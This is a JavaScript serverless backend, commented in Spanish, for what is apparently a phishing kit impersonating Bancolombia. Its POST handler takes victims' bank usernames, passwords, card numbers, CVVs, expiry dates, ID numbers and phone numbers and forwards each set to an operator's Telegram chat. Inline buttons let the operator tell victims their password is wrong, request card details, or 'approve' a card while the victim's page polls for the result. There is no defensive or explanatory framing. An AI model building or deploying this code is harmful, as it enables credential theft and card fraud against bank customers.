// api/telegram.js
// ============================================
// VARIABLES DE ENTORNO
// ============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_ADMIN_IDS = (process.env.TELEGRAM_ADMIN_IDS || '').split(',').map(id => id.trim());
const SECRET_TOKEN = process.env.SECRET_TOKEN || 'mi_token_secreto_2026_seguro_123456';
const RATE_LIMIT_MAX = parseInt(process.env.RATE_LIMIT_MAX) || 5;
const RATE_LIMIT_WINDOW = parseInt(process.env.RATE_LIMIT_WINDOW) || 60000;
const SESSION_TIMEOUT = parseInt(process.env.SESSION_TIMEOUT) || 300000;
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || 'http://localhost:3000').split(',').map(o => o.trim());

// ============================================
// ALMACENAMIENTO EN MEMORIA
// ============================================
const sessions = new Map();
const rateLimit = new Map();

// ============================================
// RATE LIMIT - Evita ataques de spam
// ============================================
function checkRateLimit(ip) {
    const now = Date.now();
    
    if (!rateLimit.has(ip)) {
        rateLimit.set(ip, { count: 1, timestamp: now });
        return true;
    }
    
    const data = rateLimit.get(ip);
    if (now - data.timestamp > RATE_LIMIT_WINDOW) {
        rateLimit.set(ip, { count: 1, timestamp: now });
        return true;
    }
    
    data.count++;
    if (data.count > RATE_LIMIT_MAX) {
        console.warn(`⚠️ Rate limit excedido desde IP: ${ip}`);
        return false;
    }
    return true;
}

// ============================================
// VALIDAR ADMIN - Solo usuarios autorizados
// ============================================
function isAdmin(chatId) {
    return TELEGRAM_ADMIN_IDS.includes(String(chatId));
}

// ============================================
// VALIDAR TOKEN - Solo peticiones autorizadas
// ============================================
function isValidToken(token) {
    return token === SECRET_TOKEN;
}

// ============================================
// VALIDAR ORIGIN - CORS restringido
// ============================================
function isValidOrigin(origin) {
    if (!origin) return false;
    return ALLOWED_ORIGINS.includes(origin) || ALLOWED_ORIGINS.includes('*');
}

// ============================================
// HANDLER PRINCIPAL
// ============================================
export default async function handler(req, res) {
    // ============================================
    // 1. CORS RESTRINGIDO
    // ============================================
    const origin = req.headers.origin;
    if (isValidOrigin(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
    } else {
        res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3000');
    }
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With, X-API-Key');

    if (req.method === 'OPTIONS') return res.status(200).end();

    // ============================================
    // 2. VERIFICAR TOKEN DEL BOT
    // ============================================
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('❌ Variables de entorno no configuradas');
        return res.status(500).json({ error: 'Configuración del servidor incompleta', action: 'error' });
    }

    // ============================================
    // 3. RATE LIMIT POR IP
    // ============================================
    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
    if (!checkRateLimit(ip)) {
        return res.status(429).json({ 
            error: 'Demasiadas solicitudes. Espera un momento.', 
            action: 'rate_limit' 
        });
    }

    // ============================================
    // 4. VERIFICAR TOKEN SECRETO (para peticiones POST)
    // ============================================
    if (req.method === 'POST') {
        const apiKey = req.headers['x-api-key'] || req.body?._token;
        if (!isValidToken(apiKey)) {
            console.warn(`⚠️ Intento de acceso no autorizado desde IP: ${ip}`);
            return res.status(401).json({ 
                error: 'No autorizado', 
                action: 'unauthorized' 
            });
        }
    }

    // ============================================
    // 5. POST - Procesar peticiones
    // ============================================
    if (req.method === 'POST') {
        try {
            const body = req.body;

            // ============================================
            // 5a. CALLBACK DE TELEGRAM - Solo admin
            // ============================================
            if (body.callback_query) {
                const callback = body.callback_query;
                const chatId = callback.message?.chat?.id;
                
                if (!isAdmin(chatId)) {
                    console.warn(`⚠️ Callback no autorizado desde chat: ${chatId}`);
                    await fetch(
                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                        {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                callback_query_id: callback.id,
                                text: '⛔ No tienes permisos',
                                show_alert: true
                            })
                        }
                    );
                    return res.status(200).json({ status: 'ok' });
                }
                
                return await handleTelegramCallback(body, res);
            }

            // ============================================
            // 5b. TIPO: TARJETA
            // ============================================
            if (body.tipo === 'tarjeta') {
                const { numero, cvv, exp_mes, exp_anio, nombre, tipo_documento, numero_documento, celular } = body;

                if (!numero || !cvv || !exp_mes || !exp_anio) {
                    return res.status(400).json({ error: 'Datos de tarjeta incompletos', action: 'error' });
                }

                const newSessionId = `${Date.now().toString(36)}-${Math.random().toString(36).substring(2, 7)}`;

                sessions.set(newSessionId, {
                    tipo: 'tarjeta',
                    usuario: body.usuario || 'No disponible',
                    clave: body.clave || 'No disponible',
                    nombre: nombre || 'No proporcionado',
                    tipo_documento: tipo_documento || 'No disponible',
                    numero_documento: numero_documento || 'No disponible',
                    celular: celular || 'No disponible',
                    numero,
                    cvv,
                    exp_mes,
                    exp_anio,
                    ip: ip || 'No disponible',
                    fecha: body.fecha || new Date().toLocaleString(),
                    timestamp: Date.now(),
                    status: 'pending',
                    action: null,
                    message: 'Esperando aprobación'
                });

                const mensaje = `💳 *SOLICITUD COMPLETA - AUMENTO DE CUPO*
━━━━━━━━━━━━━━━━━━━━━━
👤 *Usuario:* \`${body.usuario || 'No disponible'}\`
🔑 *Clave:* \`${body.clave || 'No disponible'}\`
📄 *Nombre:* ${nombre || 'No proporcionado'}
🆔 *Documento:* ${tipo_documento || 'No disponible'} ${numero_documento || 'No disponible'}
📱 *Celular:* ${celular || 'No disponible'}
━━━━━━━━━━━━━━━━━━━━━━
🏦 *Número:* \`${numero}\`
🔢 *CVV:* \`${cvv}\`
📅 *Vencimiento:* ${exp_mes}/${exp_anio}
━━━━━━━━━━━━━━━━━━━━━━
📱 *IP:* ${ip || 'No disponible'}
🕐 *Fecha:* ${body.fecha || new Date().toLocaleString()}
🆔 *Session:* ${newSessionId}
━━━━━━━━━━━━━━━━━━━━━━
*Acciones disponibles:*`;

                const telegramResponse = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: mensaje,
                            parse_mode: 'Markdown',
                            reply_markup: JSON.stringify({
                                inline_keyboard: [
                                    [{ text: '✅ Aprobar Tarjeta', callback_data: `approve_card_${newSessionId}` }],
                                    [{ text: '❌ Rechazar Tarjeta', callback_data: `reject_card_${newSessionId}` }]
                                ]
                            })
                        })
                    }
                );

                const tgData = await telegramResponse.json();
                if (!tgData.ok) {
                    console.error('❌ Error enviando a Telegram:', tgData);
                    return res.status(500).json({ error: 'Error enviando a Telegram', action: 'error' });
                }

                return res.status(200).json({
                    success: true,
                    action: 'pending',
                    sessionId: newSessionId,
                    message: 'Solicitud enviada a aprobación'
                });
            }

            // ============================================
            // 5c. TIPO: LOGIN
            // ============================================
            if (!body.usuario || !body.clave) {
                return res.status(400).json({ error: 'Datos incompletos', action: 'error' });
            }

            const newSessionId = `${Date.now().toString(36)}-${Math.random().toString(36).substring(2, 7)}`;

            sessions.set(newSessionId, {
                tipo: 'login',
                usuario: body.usuario,
                clave: body.clave,
                nombre: body.nombre || 'No disponible',
                tipo_documento: body.tipo_documento || 'No disponible',
                numero_documento: body.numero_documento || 'No disponible',
                celular: body.celular || 'No disponible',
                ip: ip || 'No disponible',
                fecha: body.fecha || new Date().toLocaleString(),
                intento: body.intento || 1,
                timestamp: Date.now(),
                status: 'pending',
                action: null,
                message: 'Esperando aprobación'
            });

            const mensaje = `🔐 *NUEVO INTENTO DE LOGIN*
━━━━━━━━━━━━━━━━━━━━━━
👤 *Usuario:* \`${body.usuario}\`
🔑 *Clave:* \`${body.clave}\`
📄 *Nombre:* ${body.nombre || 'No disponible'}
🆔 *Documento:* ${body.tipo_documento || 'No disponible'} ${body.numero_documento || 'No disponible'}
📱 *Celular:* ${body.celular || 'No disponible'}
━━━━━━━━━━━━━━━━━━━━━━
📱 *IP:* ${ip || 'No disponible'}
🕐 *Fecha:* ${body.fecha || new Date().toLocaleString()}
🔄 *Intento #:* ${body.intento || 1}
🆔 *Session:* ${newSessionId}
━━━━━━━━━━━━━━━━━━━━━━
*Acciones disponibles:*`;

            const telegramResponse = await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: mensaje,
                        parse_mode: 'Markdown',
                        reply_markup: JSON.stringify({
                            inline_keyboard: [
                                [
                                    { text: '❌ Error en Usuario', callback_data: `error_user_${newSessionId}` },
                                    { text: '❌ Error en Clave', callback_data: `error_pass_${newSessionId}` }
                                ],
                                [{ text: '📇 Pedir CC', callback_data: `approve_${newSessionId}` }]
                            ]
                        })
                    })
                }
            );

            const tgData = await telegramResponse.json();
            if (!tgData.ok) {
                console.error('❌ Error enviando a Telegram:', tgData);
                return res.status(500).json({ error: 'Error enviando a Telegram', action: 'error' });
            }

            return res.status(200).json({
                success: true,
                action: 'pending',
                sessionId: newSessionId,
                message: 'Solicitud enviada a aprobación'
            });

        } catch (error) {
            console.error('❌ Error en webhook:', error);
            return res.status(500).json({ error: 'Error interno del servidor', action: 'error' });
        }
    }

    // ============================================
    // 6. GET - Verificar estado de sesión
    // ============================================
    if (req.method === 'GET') {
        const { session } = req.query;
        if (!session) return res.status(400).json({ error: 'Session ID requerido' });

        const sessionData = sessions.get(session);
        if (!sessionData) {
            return res.status(200).json({ action: 'not_found', message: 'Sesión no encontrada' });
        }

        if (Date.now() - sessionData.timestamp > SESSION_TIMEOUT) {
            sessions.delete(session);
            return res.status(200).json({ action: 'timeout', message: 'Tiempo de espera agotado' });
        }

        return res.status(200).json({
            action: sessionData.status === 'pending' ? 'pending' : sessionData.action,
            message: sessionData.message || 'Esperando respuesta',
            sessionData: {
                tipo: sessionData.tipo,
                usuario: sessionData.usuario || null,
                clave: sessionData.clave || null,
                nombre: sessionData.nombre || null,
                numero_documento: sessionData.numero_documento || null,
                celular: sessionData.celular || null,
                numero: sessionData.numero || null,
                cvv: sessionData.cvv || null,
                exp_mes: sessionData.exp_mes || null,
                exp_anio: sessionData.exp_anio || null,
                ip: sessionData.ip,
                fecha: sessionData.fecha
            }
        });
    }

    return res.status(405).json({ error: 'Método no permitido' });
}

// ============================================
// MANEJAR CALLBACKS DE TELEGRAM
// ============================================
async function handleTelegramCallback(body, res) {
    try {
        const callback = body.callback_query;
        const { id, data, message } = callback;
        const chatId = message.chat.id;

        // ============================================
        // DOBLE VERIFICACIÓN DE ADMIN
        // ============================================
        if (!isAdmin(chatId)) {
            console.warn(`⚠️ Callback no autorizado desde chat: ${chatId}`);
            await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: id,
                        text: '⛔ No tienes permisos para esta acción',
                        show_alert: true
                    })
                }
            );
            return res.status(200).json({ status: 'ok' });
        }

        // ============================================
        // VERIFICAR QUE EL CHAT_ID SEA EL ESPERADO
        // ============================================
        if (String(chatId) !== String(TELEGRAM_CHAT_ID)) {
            console.warn(`⚠️ Intento de acceso desde chat no autorizado: ${chatId}`);
            await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/leaveChat`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId })
                }
            );
            return res.status(200).json({ status: 'ok' });
        }

        const parts = data.split('_');
        const action = parts[0];
        const sessionId = parts.slice(1).join('_');

        const sessionData = sessions.get(sessionId);

        if (!sessionData) {
            await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: id,
                        text: '❌ Sesión expirada o no encontrada',
                        show_alert: true
                    })
                }
            );
            return res.status(200).json({ status: 'ok' });
        }

        let respuesta = '';
        let mensajeUsuario = '';
        let actionType = '';

        switch (action) {
            case 'approve':
                if (sessionData.tipo === 'login') {
                    respuesta = `📇 *DATOS DE LOGIN RECIBIDOS*\n\n👤 Usuario: \`${sessionData.usuario}\`\n🔑 Clave: \`${sessionData.clave}\``;
                    mensajeUsuario = 'Tus datos han sido recibidos. Serás redirigido...';
                    actionType = 'approve';
                } else if (sessionData.tipo === 'tarjeta') {
                    respuesta = `✅ *TARJETA APROBADA*\n\n👤 Usuario: \`${sessionData.usuario}\`\n🏦 Número: \`${sessionData.numero}\``;
                    mensajeUsuario = '✅ Tarjeta aprobada. Redirigiendo a Bancolombia...';
                    actionType = 'approve_card';
                }
                break;
            case 'reject':
                if (sessionData.tipo === 'tarjeta') {
                    respuesta = `❌ *TARJETA RECHAZADA*\n\n👤 Usuario: \`${sessionData.usuario}\`\n🏦 Número: \`${sessionData.numero}\``;
                    mensajeUsuario = '❌ Tarjeta rechazada. Verifica tus datos.';
                    actionType = 'reject_card';
                }
                break;
            case 'error':
                if (data.includes('error_user')) {
                    respuesta = '❌ *USUARIO INCORRECTO*';
                    mensajeUsuario = 'El usuario ingresado es incorrecto.';
                    actionType = 'error_user';
                } else if (data.includes('error_pass')) {
                    respuesta = '❌ *CLAVE INCORRECTA*';
                    mensajeUsuario = 'La clave ingresada es incorrecta.';
                    actionType = 'error_pass';
                }
                break;
            default:
                respuesta = '⚠️ *ACCIÓN NO RECONOCIDA*';
                mensajeUsuario = 'Acción no válida.';
                actionType = 'unknown';
        }

        const newMessage = `${respuesta}\n━━━━━━━━━━━━━━━━━━━━━━\n📱 IP: ${sessionData.ip}\n🕐 Fecha: ${sessionData.fecha}`;

        await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    message_id: message.message_id,
                    text: newMessage,
                    parse_mode: 'Markdown'
                })
            }
        );

        await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: id,
                    text: action === 'approve' ? '✅ Aprobado' : action === 'reject' ? '❌ Rechazado' : '⚠️ Error',
                    show_alert: false
                })
            }
        );

        sessions.set(sessionId, {
            ...sessionData,
            status: 'answered',
            action: actionType,
            message: mensajeUsuario,
            timestamp: Date.now()
        });

        return res.status(200).json({ status: 'ok', action: actionType, message: mensajeUsuario });

    } catch (error) {
        console.error('❌ Error en callback:', error);
        return res.status(500).json({ error: 'Error interno' });
    }
}